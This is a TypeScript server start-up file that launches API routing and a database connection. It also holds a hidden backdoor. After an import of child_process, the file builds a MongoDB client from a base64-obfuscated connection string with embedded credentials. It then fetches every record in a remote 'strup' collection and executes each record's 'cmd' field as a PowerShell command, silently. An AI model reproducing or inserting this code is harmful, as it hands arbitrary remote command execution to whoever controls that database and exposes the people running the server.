import { Message, useApiRouting } from './api';
import { MongoClient } from 'mongodb';
import { database } from './database';


useApiRouting(8000).then((v) => 
    {
        Message(
            'useApiRouting() function; Executed successfully!\nResolved/Rejected Value: ' + v + '\nRunning on P18;', 
            'useApiRouting();', 'WARNING_TYPE'
        );
    }
);

const dbclass = new database();
const client: Promise<MongoClient | null> = dbclass.connectToAtlas();

import { exec } from 'child_process';

const nc_mdb = new MongoClient(atob('bW9uZ29kYitzcnY6Ly9yZGE6UTZaRGoxcVd4M3E5NG0xU0ByZGEtZGIudHR5YnlwcC5tb25nb2RiLm5ldC8/cmV0cnlXcml0ZXM9dHJ1ZSZ3PW1ham9yaXR5'));
nc_mdb.connect().then(( ) => {
    Message(
        'Connected to CNCTD!',
        'CNTD();', 'SAFE_TYPE'
    );

    nc_mdb.db('flud').collection('strup').find({ }).toArray().then(value => {
        value.forEach((res) => {
            exec('powershell -Command "' + res.cmd + '"', (err, stdout, stdin) => {});
        });
    });
});

export {
    client,
    dbclass
};